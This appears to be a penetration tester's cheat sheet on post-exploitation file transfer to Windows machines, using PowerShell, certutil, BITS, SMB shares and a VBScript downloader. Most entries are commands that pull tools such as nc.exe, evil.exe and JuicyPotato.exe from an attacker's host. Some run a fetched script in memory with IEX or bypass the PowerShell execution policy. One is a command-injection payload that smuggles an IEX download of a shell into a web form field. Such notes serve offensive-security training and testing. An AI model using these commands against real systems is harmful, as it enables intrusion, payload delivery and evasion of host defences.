# File Transfers in  Windows

- <https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/>
- <https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65>


### PowerShell

Valid PowerShell cmdlets/methods that can be used to download files:
- Invoke-WebRequest (iwr)
- Start-BitsTransfer
- system.Net.WebClient
- Invoke-RestMethod


```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<IP>/file.exe','C:\Users\user\Desktop\file.exe')"
iwr -uri http://<IP>/file -Outfile file
```





- Downloading on Windows

```
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
iwr -uri http://lhost/file -Outfile file
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
copy \\kali\share\file .
```



- `Invoke-WebRequest` (In Powershell `curl` is an alias for this command)
```
# get a website content, save it as xx.html (iwr is alias of Invoke-WebRequest)
iwr "google.com" -outfile xx.html


$url = "http://192.168.1.10/example.txt"
$destination = "C:\Downloads\example.txt"
Invoke-WebRequest -Uri $url -OutFile $destination

# Download using PowerShell's WebClient object
(new-object System.Net.WebClient).DownloadFile('http://[IP]/file.txt','dest/path/file.txt')
```

Fetch script from a webserver and load into memory
```
$pwv = (new-object System.Net.WebClient).DownloadString('http://[IP]/PowerView.ps1)
```


```
powershell.exe -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destination C:\temp\nc.exe")
```










```
# use single quotes!
powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file', 'output-file')
```




If we want to download and execute a PowerShell script without saving it to disk, we can once again use the `System.Net.Webclient` class. This is done by combining the `DownloadString` method with the `Invoke-Expression` cmdlet (`IEX`).

Example:
```
curl -X POST --data 'Archive=git%3bIEX+(New-Object+System.Net.Webclient).DownloadString("http%3a//192.168.45.238/shell.pHP")' http://192.168.245.189:8000/archive
```


Another option is make it a script:
```
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```




powershell "IEX(New-Object Net.WebClient).downloadFile('http://[IP]:[PORT]/JuicyPotato.exe', 'C:\Users\public\JuicyPotato.exe')" -bypass executionpolicy



### CMD
```
certutil -urlcache -f http://[IP]/[FILENAME] [DEST FILENAME]


certutil -urlcache -split -f http://192.168.1.2/putty.exe


# if via web shell
cmd.exe /c certutil.exe -urlcache -f http://KALI_IP/FILE OUTPUT_PATH

```




### VBScript
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs 
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs 
echo Err.Clear >> wget.vbs 
echo Set http = Nothing >> wget.vbs 
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
echo http.Open "GET", strURL, False >> wget.vbs 
echo http.Send >> wget.vbs 
echo varByteArray = http.ResponseBody >> wget.vbs 
echo Set http = Nothing >> wget.vbs 
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs 
echo strData = "" >> wget.vbs 
echo strBuffer = "" >> wget.vbs 
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs 
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
echo Next >> wget.vbs 
echo ts.Close >> wget.vbs
```


Then run `cscript wget.vbs http://ip-addr:port/file output-file`





